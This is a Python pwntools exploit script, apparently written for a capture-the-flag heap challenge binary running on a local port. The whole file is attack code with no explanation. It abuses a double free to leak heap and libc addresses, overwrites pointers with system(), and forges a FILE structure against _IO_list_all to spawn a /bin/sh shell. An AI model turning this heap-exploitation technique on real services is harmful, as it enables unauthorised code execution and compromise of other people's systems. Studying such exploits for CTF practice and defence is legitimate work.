#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from pwn import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 5421)

p = lambda x: p64(x)

idx=-1

def option(choice):
	io.sendlineafter(b"> ", str(choice).encode('latin-1'))

def add(size, data, hack=False):
	global idx
	idx+=1
	print(f"add {idx} {size}")
	option(1)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendlineafter(b"enter the size : ", str(size).encode('latin-1'))
	if hack:
		io.interactive()
	io.sendafter(b"Input : ", data)
	return idx

def delete(idx):
	print(f"delete {idx}")
	option(2)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))

def edit(idx, data):
	print(f"edit {idx}")
	option(4)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	io.sendafter(b"Input : ", data)

def show(idx):
	option(3)
	io.sendlineafter(b"enter the index : ", str(idx).encode('latin-1'))
	return io.recvline()

libc=ELF("./libc.so.6")
# io = process("./chall")
io = remote("127.0.0.1", "5421")


add(120, p(0x0)*13 + p(0x81))
add(120, p(0x0)*13 + p(0x21))
add(120, (p(0x0) + p(0x21))*7)
delete(0)
delete(1)
delete(0)
heap_base=u64(show(0).strip(b'\n').ljust(8, b'\x00'))-0x80
print(hex(heap_base))
add(120, p(heap_base+0x70))
add(120, p(heap_base+0x70))
add(120, p(heap_base+0x70))
add(120, p(0) + p(0xa1) + b'\x00'*(120-0x10))
delete(1)
libc.address=u64(show(1).strip(b'\n').ljust(8, b'\x00'))-0x3c4b78
print(hex(libc.address))
delete(2)
add(120, b"\x00"*0x34 + p32(0) + p(0)*2 + p(heap_base+0x10))
delete(0)
add(120, p(libc.sym.system)*3 + p(libc.sym.system))
delete(6)
add(120, ( b"/bin/sh\x00" + p(0x61) + p(0xdeadbeef) + p(libc.sym._IO_list_all-0x10) + p(0) + p(1)).ljust(120, b'\x00'))
add(21, b"A", hack=True)
io.interactive()
